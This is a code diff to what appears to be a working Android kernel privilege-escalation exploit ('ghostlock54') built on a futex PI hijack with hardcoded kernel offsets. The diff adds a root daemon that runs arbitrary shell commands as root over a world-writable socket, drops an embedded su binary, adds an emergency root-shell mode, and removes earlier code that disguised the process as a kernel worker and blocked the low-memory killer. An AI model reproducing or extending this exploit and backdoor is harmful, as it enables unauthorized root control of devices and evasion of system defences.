@@ -24,6 +24,17 @@
 #include <ucontext.h>
 #include <unistd.h>
 #include <time.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/uio.h>
+
+// 包含由 Makefile 生成的 su 二进制数据
+#if __has_include("su_bin.h")
+#include "su_bin.h"
+#else
+static const unsigned char su_bin[] = {0};
+static const unsigned int su_bin_len = 0;
+#endif
 
 // ================= Logging System =================
 #define COLOR_GREEN "\033[32m"
@@ -31,8 +42,6 @@
 #define COLOR_YELLOW "\033[33m"
 #define COLOR_DEFAULT "\033[0m"
 
-// Fatal error handler: Sleep infinitely to prevent kernel panic caused by
-// exiting while dangling pointers (PI waiter) still exist in the kernel.
 #define pr_error(fmt, ...) do { \
         printf(COLOR_RED "[!] " COLOR_DEFAULT fmt, ##__VA_ARGS__); fflush(stdout); \
         for(;;) sleep(3600); \
@@ -65,7 +74,7 @@ static double timer_ms(void) {
 #define OFF_TASK_STATE UINT64_C(0x593324)
 #define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x358d64)
 #define OFF_SEL_READ_ENFORCE UINT64_C(0x70ccec)
-#define OFF_TASK_SECCOMP UINT64_C(0x8d0)      /* offsetof(task_struct, seccomp) */
+#define OFF_TASK_SECCOMP UINT64_C(0x8d0)
 #define ARM64_REG_COUNT 33
 #define ARM64_REG_MASK ((UINT64_C(1) << ARM64_REG_COUNT) - 1)
 
@@ -100,6 +109,124 @@ static atomic_int respray_ready, respray_done;
 static atomic_uintptr_t respray_parent, respray_value, respray_lock;
 static unsigned fake_lock_index;
 static int y_leak_only;
+
+// ================= Rootd Module =================
+#define SOCKET_PATH "/data/local/tmp/root.sock"
+#define WHITELIST_PATH "/data/adb/rootd/whitelist"
+#define PACKAGES_LIST "/data/system/packages.list"
+
+int get_uid_by_pkg(const char *pkg) {
+    FILE *fp = fopen(PACKAGES_LIST, "r"); if (!fp) return -1;
+    char line[512], name[256]; int uid;
+    while (fgets(line, sizeof(line), fp)) {
+        if (sscanf(line, "%255s %d", name, &uid) == 2 && strcmp(name, pkg) == 0) { fclose(fp); return uid; }
+    }
+    fclose(fp); return -1;
+}
+
+int check_whitelist(uid_t uid) {
+    if (uid == 0 || uid == 1000 || uid == 2000) return 1;
+    FILE *fp = fopen(WHITELIST_PATH, "r"); if (!fp) return 0;
+    char line[256];
+    while (fgets(line, sizeof(line), fp)) {
+        line[strcspn(line, "\r\n")] = 0;
+        char *p = line; while (*p == ' ' || *p == '\t') p++;
+        if (*p == '\0' || *p == '#') continue;
+        if (strncmp(p, "uid:", 4) == 0) {
+            if (uid == (uid_t)atoi(p + 4)) { fclose(fp); return 1; }
+        } else if (uid == (uid_t)get_uid_by_pkg(p)) { fclose(fp); return 1; }
+    }
+    fclose(fp); return 0;
+}
+
+void run_rootd_daemon() {
+    int test_fd = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (test_fd >= 0) {
+        struct sockaddr_un test_addr = { .sun_family = AF_UNIX };
+        strncpy(test_addr.sun_path, SOCKET_PATH, sizeof(test_addr.sun_path) - 1);
+        if (connect(test_fd, (struct sockaddr *)&test_addr, sizeof(test_addr)) == 0) {
+            close(test_fd); _exit(0); 
+        }
+        close(test_fd);
+    }
+
+    signal(SIGPIPE, SIG_IGN);
+    signal(SIGCHLD, SIG_IGN); 
+
+    unlink(SOCKET_PATH);
+    int server = socket(AF_UNIX, SOCK_STREAM, 0);
+    struct sockaddr_un addr = { .sun_family = AF_UNIX };
+    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
+    
+    if (bind(server, (struct sockaddr *)&addr, sizeof(addr)) < 0) _exit(1);
+    chmod(SOCKET_PATH, 0777);
+    if (listen(server, 10) < 0) _exit(1);
+
+    while (1) {
+        int client = accept(server, NULL, NULL);
+        if (client < 0) continue;
+
+        struct ucred cred; socklen_t len = sizeof(cred);
+        if (getsockopt(client, SOL_SOCKET, SO_PEERCRED, &cred, &len) < 0 || !check_whitelist(cred.uid)) {
+            const char *msg = "[-] Denied.\n"; write(client, msg, strlen(msg)); close(client); continue;
+        }
+
+        char payload[4096] = {0}; int fds[3] = {-1, -1, -1};
+        struct msghdr msg = {0}; struct iovec io = { .iov_base = payload, .iov_len = sizeof(payload) - 1 };
+        char cmsgbuf[CMSG_SPACE(sizeof(int) * 3)];
+        msg.msg_iov = &io; msg.msg_iovlen = 1; msg.msg_control = cmsgbuf; msg.msg_controllen = sizeof(cmsgbuf);
+        
+        if (recvmsg(client, &msg, 0) > 0) {
+            struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
+            if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS)
+                memcpy(fds, CMSG_DATA(cmsg), sizeof(int) * 3);
+        }
+
+        char *uid_s = payload, *gid_s = strchr(uid_s, ':');
+        if (!gid_s) { close(client); continue; } *gid_s++ = '\0';
+        char *grp_s = strchr(gid_s, ':');
+        if (!grp_s) { close(client); continue; } *grp_s++ = '\0';
+        char *cmd = strchr(grp_s, ':');
+        if (!cmd) { close(client); continue; } *cmd++ = '\0';
+
+        pid_t pid = fork();
+        if (pid == 0) {
+            close(server);
+            if (fds[0] != -1) { dup2(fds[0], 0); dup2(fds[1], 1); dup2(fds[2], 2); }
+            
+            if (isatty(0)) {
+                setsid(); ioctl(0, TIOCSCTTY, 0);
+                signal(SIGTTIN, SIG_IGN); signal(SIGTTOU, SIG_IGN);
+            }
+
+            uid_t u = atoi(uid_s); gid_t g = atoi(gid_s);
+            if (u > 0) {
+                gid_t g_arr[32]; int g_cnt = 0; char *saveptr = NULL;
+                char *g_tok = strtok_r(grp_s, ",", &saveptr);
+                while (g_tok && g_cnt < 32) { g_arr[g_cnt++] = atoi(g_tok); g_tok = strtok_r(NULL, ",", &saveptr); }
+                setgid(g);
+                if (g_cnt > 0) setgroups(g_cnt, g_arr); else setgroups(1, &g);
+                setuid(u);
+            }
+
+            pid_t inner = fork();
+            if (inner == 0) {
+                if (strlen(cmd) == 0) execl("/system/bin/sh", "sh", (char *)NULL);
+                else execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
+                exit(1);
+            }
+            
+            int status; waitpid(inner, &status, 0);
+            char exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
+            write(client, &exit_code, 1);
+            exit(0);
+        }
+        
+        if (fds[0] != -1) { close(fds[0]); close(fds[1]); close(fds[2]); }
+        close(client);
+    }
+}
+// ==============================================
 
 static long raw_futex(volatile int *u1, long op, long val, long val2,
                       volatile int *u2, long val3) {
@@ -580,7 +707,6 @@ static int write_value(uint64_t target, uint64_t value) {
   atomic_store(&respray_lock, k_fake_lock2);
   atomic_store(&respray_done, 0);
   
-  // Trigger the underlying PI hijack write
   atomic_store_explicit(&respray_ready, 1, memory_order_release);
   while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
   if (atomic_load(&respray_done) < 0) {
@@ -590,8 +716,18 @@ static int write_value(uint64_t target, uint64_t value) {
 }
 
 int main(int argc, char **argv) {
+  if (argc == 2 && strcmp(argv[1], "--rootd") == 0) {
+      run_rootd_daemon();
+      return 0;
+  }
+
+  int emergency_mode = 0;
+  if (argc == 2 && strcmp(argv[1], "--emergency") == 0) {
+      emergency_mode = 1;
+      printf("[*] EMERGENCY MODE ENABLED: Will spawn a direct root shell bypassing rootd.\n");
+  }
+
   setvbuf(stdout, NULL, _IONBF, 0);
-  // Ignore SIGHUP to survive terminal closure
   signal(SIGHUP, SIG_IGN);
   __orig_stdout = dup(STDOUT_FILENO);
   stage_fd = open("/data/local/tmp/ghostlock54.stage", O_WRONLY | O_CREAT | O_CLOEXEC, 0600);
@@ -688,7 +824,7 @@ int main(int argc, char **argv) {
   int task_pipe[2];
   if (pipe(task_pipe) < 0) { pr_error("pipe failed\n"); }
 
-  pr_info("Forking isolated root shell process...\n");
+  pr_info("Forking isolated child process...\n");
   pid_t child_pid = fork();
   if (child_pid < 0) { pr_error("fork failed\n"); }
 
@@ -704,22 +840,34 @@ int main(int argc, char **argv) {
       __asm__ volatile("yield" ::: "memory");
     }
     
-    pr_success("[CHILD] uid=%d euid=%d\n", getuid(), geteuid());
-    pr_success("[CHILD] Running root action. Launching shell...\n");
-    
-    {
-      struct __user_cap_header_struct ch = { .version = _LINUX_CAPABILITY_VERSION_3, .pid = 0 };
-      struct __user_cap_data_struct cd[2] = {{0}};
-      if (syscall(SYS_capget, &ch, cd) == 0) {
-        pr_info("[CHILD] Eff=%08x%08x Prm=%08x%08x Bnd=%08x%08x\n", cd[1].effective, cd[0].effective, cd[1].permitted, cd[0].permitted, cd[1].inheritable, cd[0].inheritable);
-      }
+    if (emergency_mode) {
+        pr_success("[CHILD] EMERGENCY: Spawning direct root shell...\n");
+        dup2(__orig_stdout, STDOUT_FILENO);
+        dup2(__orig_stdout, STDERR_FILENO);
+        signal(SIGHUP, SIG_IGN);
+        execl("/system/bin/sh", "sh", (char *)NULL);
+        _exit(1);
+    } else {
+        if (su_bin_len > 0) {
+            int sfd = open("/data/local/tmp/su", O_WRONLY | O_CREAT | O_TRUNC, 0755);
+            if (sfd >= 0) {
+                ssize_t w = write(sfd, su_bin, su_bin_len);
+                (void)w;
+                close(sfd);
+                chmod("/data/local/tmp/su", 0755);
+            }
+        }
+
+        pid_t rd_pid = fork();
+        if (rd_pid == 0) {
+            setsid();
+            int fd = open("/dev/null", O_RDWR);
+            if (fd >= 0) { dup2(fd, 0); dup2(fd, 1); dup2(fd, 2); if (fd > 2) close(fd); }
+            execl("/proc/self/exe", "ghostlock54", "--rootd", (char *)NULL);
+            _exit(1);
+        }
+        _exit(0);
     }
-    
-    dup2(__orig_stdout, STDOUT_FILENO);
-    dup2(__orig_stdout, STDERR_FILENO);
-    signal(SIGHUP, SIG_IGN);
-    execl("/system/bin/sh", "sh", (char *)NULL);
-    _exit(1);
   }
 
   close(task_pipe[1]);
@@ -783,28 +931,26 @@ int main(int argc, char **argv) {
   record_stage('f');
   pr_success("Child seccomp mode disabled (task+0x%x)\n", (unsigned)OFF_TASK_SECCOMP);
 
-  TIMER("Exploit complete, waking child shell");
   __atomic_store_n(done_flag, 1, __ATOMIC_RELEASE);
   fflush(stdout);
 
-  if (__orig_stdout >= 0) close(__orig_stdout);
-  close(STDIN_FILENO);
-  close(STDOUT_FILENO);
-  close(STDERR_FILENO);
-
-  // Anti-kill mechanisms:
-  // 1. Detach from Termux process group to prevent being killed together
-  setsid();
-  
-  // 2. Disguise as a kernel worker thread to evade Android background cleanup
-  prctl(PR_SET_NAME, "[kworker/u16:2]", 0, 0, 0);
-  
-  // 3. Maximize OOM score adjustment so LMK won't kill us
-  int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
-  if (oom_fd >= 0) {
-      write(oom_fd, "-1000", 5);
-      close(oom_fd);
+  if (!emergency_mode) {
+      TIMER("Exploit complete, starting rootd daemon");
+      usleep(10000); 
+      pr_success("Rootd has been launched in the background.\n");
+      pr_success("You can now run '/data/local/tmp/su' for a root shell.\n");
+      pr_success("Emergency fallback: run with '--emergency' to get a direct shell.\n");
+  } else {
+      TIMER("Exploit complete, entering emergency shell mode");
+      pr_success("Rootd has been launched in the background.\n");
+      printf("\n[+] You are now in an EMERGENCY ROOT SHELL.\n");
+      printf("[+] The exploit process will be detached and kept alive in the background.\n");
+      printf("[+] Type 'exit' to return to Termux.\n\n");
+      
+      int status;
+      waitpid(child_pid, &status, 0);
   }
 
+  // 恢复最原始的保活方式：主进程原地死循环挂起
   for (;;) pause();
 }
